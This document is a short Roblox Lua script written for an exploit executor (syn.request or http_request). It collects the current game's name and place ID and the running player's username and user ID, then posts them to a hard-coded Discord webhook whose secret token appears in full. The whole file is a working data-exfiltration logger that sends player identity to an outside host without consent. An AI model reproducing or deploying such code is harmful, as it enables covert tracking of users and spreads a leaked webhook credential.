local url = "https://discord.com/api/webhooks/1242987823762640908/V3fDqH-IeSwt-wNZQU8qnMfkQnrPrS_iRa0cQ5oOwp10vigU0aoM6RLZ7qxekzaMz3du"
local Content = '_**[Dum Was Here](https://guns.lol/Dum1121)**_'
local getname = {}
    local Embed = {
        ["title"] = "Notification",
        ["description"] = "**PlaceName: ["..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."](https://roblox.com/games/"..game.PlaceId..")**\
        **PlaceId: "..game.PlaceId.."**\n\
        **Username: ||".. game.Players.LocalPlayer.Name .. "||\
        UserId: ||" .. game.Players.LocalPlayer.UserId .. "||**",
        ["type"] = "rich",
        ["color"] = tonumber(0xffff00),
};
(syn and syn.request or http_request or http.request) {
Url = url;
Method = 'POST';
Headers = {
    ['Content-Type'] = 'application/json';
};
Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
};

--"["..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."](https://roblox.com/games/"..game.PlaceId..")"